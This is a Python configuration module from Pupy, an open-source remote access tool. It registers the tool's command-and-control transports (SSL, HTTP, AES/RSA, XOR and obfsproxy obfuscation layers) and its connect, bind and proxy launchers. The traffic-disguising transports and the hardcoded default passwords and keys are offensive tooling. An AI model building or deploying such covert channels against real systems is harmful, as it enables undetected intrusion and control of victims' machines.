# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os
import logging
from .servers import PupyTCPServer, PupyAsyncTCPServer
from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient, PupyAsyncClient
from .transports.dummy import DummyPupyTransport
from .transports.b64 import B64Client, B64Server, B64Transport
from .transports.http import PupyHTTPClient, PupyHTTPServer
from .transports.xor import XOR
from .transports.aes import AES256, AES128
from .transports.rsa_aes import RSA_AESClient, RSA_AESServer
import rsa
try:
    from .transports.obfs3.obfs3 import Obfs3Client, Obfs3Server
    obfs3_available=True
except ImportError as e:
    #to make pupy works even without obfs3 dependencies
    logging.warning("%s. The obfs3 transport has been disabled."%e)
    obfs3_available=False

try:
    from .transports.scramblesuit.scramblesuit import ScrambleSuitClient, ScrambleSuitServer
    scramblesuit_available=True
except ImportError as e:
    #to make pupy works even without scramblesuit dependencies
    logging.warning("%s. The scramblesuit transport has been disabled."%e)
    scramblesuit_available=False
from .streams import *
from .launchers.simple import SimpleLauncher
from .launchers.auto_proxy import AutoProxyLauncher
from .launchers.bind import BindLauncher
from base import chain_transports
try:
    import ConfigParser as configparser
except ImportError:
    import configparser
from rpyc.utils.authenticators import SSLAuthenticator

ssl_auth=None

def ssl_authenticator():
    config = configparser.ConfigParser()
    config.read("pupy.conf")
    return SSLAuthenticator(config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")

#scramblesuit password must be 20 char long
scramblesuit_passwd="th!s_iS_pupy_sct_k3y"

transports={}
launchers={}

transports["ssl"]={
        "info" : "TCP transport wrapped with SSL",
        "server" : PupyTCPServer,
        "client": PupySSLClient,
        "client_kwargs" : {},
        "authenticator" : ssl_authenticator,
        "stream": PupySocketStream ,
        "client_transport" : DummyPupyTransport,
        "server_transport" : DummyPupyTransport,
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }
transports["ssl_proxy"]={
        "info" : "TCP transport wrapped with SSL and passing through a SOCKS4/SOCKS5/HTTP proxy",
        "server" : PupyTCPServer,
        "client": PupyProxifiedSSLClient,
        "client_kwargs" : {'proxy_addr': None, 'proxy_port': None, 'proxy_type':'HTTP'},
        "authenticator" : ssl_authenticator,
        "stream": PupySocketStream ,
        "client_transport" : DummyPupyTransport,
        "server_transport" : DummyPupyTransport,
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }
transports["ssl_aes"]={
        "info" : "TCP transport wrapped with SSL and AES",
        "server" : PupyTCPServer,
        "client": PupySSLClient,
        "client_kwargs" : {},
        "authenticator" : ssl_authenticator,
        "stream": PupySocketStream ,
        "client_transport" : AES256.custom(iterations=10000),
        "server_transport" : AES256.custom(iterations=10000),
        "client_transport_kwargs": {"password" : "Pupy_d3f4uld_p4sS"},
        "server_transport_kwargs": {"password" : "Pupy_d3f4uld_p4sS"},
    }
transports["tcp_cleartext"]={
        "info" : "Simple TCP transport transmitting in cleartext",
        "server" : PupyTCPServer,
        "client": PupyTCPClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : DummyPupyTransport,
        "server_transport" : DummyPupyTransport,
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }
transports["tcp_cleartext_proxy"]={
        "info" : "TCP transport transmitting in cleartext and passing through a SOCKS4/SOCKS5/HTTP proxy",
        "server" : PupyTCPServer,
        "client": PupyProxifiedTCPClient,
        "client_kwargs" : {'proxy_addr':'127.0.0.1', 'proxy_port':8080, 'proxy_type':'HTTP'},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : DummyPupyTransport,
        "server_transport" : DummyPupyTransport,
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }
transports["tcp_base64"]={
        "info" : "TCP transport with base64 encoding",
        "server" : PupyTCPServer,
        "client": PupyTCPClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : B64Client,
        "server_transport" : B64Server,
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }

transports["http_cleartext"]={ #TODO fill with empty requests/response between each request/response to have only a following of req/res and not unusual things like req/req/req/res/res/req ...
        "info" : "TCP transport using HTTP with base64 encoded payloads (synchrone with Keep-Alive headers and one 3-way-handshake)",
        "server" : PupyTCPServer,
        "client": PupyTCPClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : PupyHTTPClient,
        "server_transport" : PupyHTTPServer,
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }
transports["http_aes"]={
        "info" : "TCP transport using HTTP+AES",
        "server" : PupyTCPServer,
        "client": PupyTCPClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : chain_transports(
                PupyHTTPClient.custom(keep_alive=True),
                AES256.custom(password=scramblesuit_passwd, iterations=10000)
            ),
        "server_transport" : chain_transports(
                PupyHTTPServer,
                AES256.custom(password=scramblesuit_passwd, iterations=10000)
            ),
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }
transports["tcp_aes"]={
        "info" : "TCP transport that encodes traffic using AES256 with a static password hashed with PBKDF2",
        "server" : PupyTCPServer,
        "client": PupyTCPClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : AES256,
        "server_transport" : AES256,
        "client_transport_kwargs": {"password": "pupy_t3st_p4s5word"},
        "server_transport_kwargs": {"password": "pupy_t3st_p4s5word"},
    }



DEFAULT_RSA_PUB_KEY="""
-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAu1AvqNawlgXdpT3s0/YoOSj3bSsGOd2UXrDKmEt3VkGvDVyxllwm
9TctdCIS8X9ziOtpSH2yYcS1zwVD0qb/Dt6im6Z0jiaiizsZPqJL16SfmP7b41ub
iCcM4a3gI1wRxt3HtBDgqPVZTqsKPsC3m6fiWfOQCy9CmLSBlwwE+9+elnUG4pvA
XQn0KDdrnzo5qGLxFyj9/jLI4y+rhS9DlwgsmFd42MCaJ/CgceM7QChN0zjxxT23
Y/RSR6wnYKasDbz7KoCa/QkYpvN4XqmvUZVQDI2y8F87ta/Cqo3UMEz5hNYt96LU
KN2qXNVOeiCO57tFFriWnKk6cAFHgrGzwA23xKUYB9/YivaEMjrh7C3907B+I1bK
t/BXOxdRwbTHkWQWrpxfUGs+5LJzwwsixzNJOifqgFyZTef6EyNTwSyr0oRslNk7
JIrE1Lab5Ve26+M92pCrs/UOIxpSWSKRmJeWcyAiw3crYrzAxC9r654BnmCfeWtn
MRAWmUrljx6aJSojTAbeY9aDDrYQRuQ7VevO+SHxYwOG/1Jq+qgznTN3zroUI97w
5g1oVVJrthUrYQZYKboaiEZmQckxLU5ca9pAyXu/o4pa1ez4a14YbollG9bjSnbK
+qRicAn26w5undwWlPX52DnrOw0v9sAqazfzG5rMH7mKWnSDvHPWOAsCAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

transports["tcp_rsa_aes"]={
        "info" : "TCP transport that encodes traffic using AES256 with a static password hashed with PBKDF2",
        "server" : PupyTCPServer,
        "client": PupyTCPClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=128),
        "server_transport" : RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=128),
        "client_transport_kwargs": {"password": "pupy_t3st_p4s5word"},
        "server_transport_kwargs": {"password": "pupy_t3st_p4s5word"},
    }

transports["trololo"]={
        "info" : "test wrapping",
        "server" : PupyTCPServer,
        "client": PupyTCPClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupySocketStream ,
        "client_transport" : chain_transports(
                PupyHTTPClient.custom(method="POST", user_agent="Mozilla 5.0", keep_alive=True),
                B64Transport,
                PupyHTTPClient.custom(method="GET", user_agent="Mozilla-ception", keep_alive=True),
                XOR.custom(xorkey="trololo"),
                AES256.custom(password="plop2", iterations=10000),
                RSA_AESClient.custom(pubkey_path="crypto/rsa_public_key.pem", rsa_key_size=4096, aes_size=256),
                AES128.custom(password="plop1", iterations=10000),
            ),
        "server_transport" : chain_transports(
                PupyHTTPServer.custom(response_code="418 I'm a teapot"),
                B64Transport,
                PupyHTTPServer,
                XOR.custom(xorkey="trololo"),
                AES256.custom(password="plop2", iterations=10000),
                RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
                AES128.custom(password="plop1", iterations=10000),
            ),
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }




transports["async_http_cleartext"]={
        "info" : "TCP transport using HTTP with base64 encoded payloads (asynchrone with client pulling the server and multiple 3-way handshakes (slow))",
        "server" : PupyAsyncTCPServer,
        "client": PupyAsyncClient,
        "client_kwargs" : {},
        "authenticator" : None,
        "stream": PupyAsyncTCPStream ,
        "client_transport" : PupyHTTPClient.custom(keep_alive=False),
        "server_transport" : PupyHTTPServer,
        "client_transport_kwargs": {},
        "server_transport_kwargs": {},
    }

if obfs3_available:
    transports["obfs3"]={
            "info" : "TCP transport using obfsproxy's obfs3 transport",
            "server" : PupyTCPServer,
            "client": PupyTCPClient,
            "client_kwargs" : {},
            "authenticator" : None,
            "stream": PupySocketStream ,
            "client_transport" : Obfs3Client,
            "server_transport" : Obfs3Server,
            "client_transport_kwargs": {},
            "server_transport_kwargs": {},
        }
if scramblesuit_available:
    transports["scramblesuit"]={
            "info" : "TCP transport using the obfsproxy's scramblesuit transport",
            "server" : PupyTCPServer,
            "client": PupyTCPClient,
            "client_kwargs" : {},
            "authenticator" : None,
            "stream": PupySocketStream ,
            "client_transport" : ScrambleSuitClient,
            "server_transport" : ScrambleSuitServer,
            "client_transport_kwargs": {"password":scramblesuit_passwd}, 
            "server_transport_kwargs": {"password":scramblesuit_passwd},
        }

launchers["connect"]=SimpleLauncher
launchers["simple"]=SimpleLauncher # keeped for backward-compatibility with old windows templates
launchers["auto_proxy"]=AutoProxyLauncher
launchers["bind"]=BindLauncher

